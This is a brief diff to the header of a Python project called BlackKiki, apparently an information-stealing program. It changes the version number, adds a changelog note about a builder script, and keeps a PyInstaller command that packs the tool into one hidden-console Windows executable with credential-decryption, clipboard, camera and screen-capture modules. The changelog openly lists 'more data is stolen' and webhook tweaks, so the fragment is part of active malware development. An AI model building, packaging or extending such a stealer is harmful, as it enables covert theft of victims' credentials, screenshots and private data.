@@ -2,9 +2,10 @@
 # pyinstaller main.py --onefile --noconsole --clean --name BlackKiki --icon=icon.ico --hidden-import=pygame --hidden-import=pygame.camera --hidden-import=win32crypt --hidden-import=win32clipboard --hidden-import=win32api --hidden-import=winreg --hidden-import=win32security --hidden-import=win32file --hidden-import=win32process --hidden-import=win32event --hidden-import=psutil --hidden-import=Crypto.Cipher.AES --hidden-import=PIL --hidden-import=PIL.ImageGrab --collect-all pygame --collect-all PIL --noupx
 
 # ------------------------------------
-# BlackKiki V1.6
+# BlackKiki V1.7
 # ------------------------------------
 # Changes:
+# IMPORTANT -> Use the builder.py file for creation
 # Added webhook error ignoring
 # Added more paths
 # Added so more data is stolen
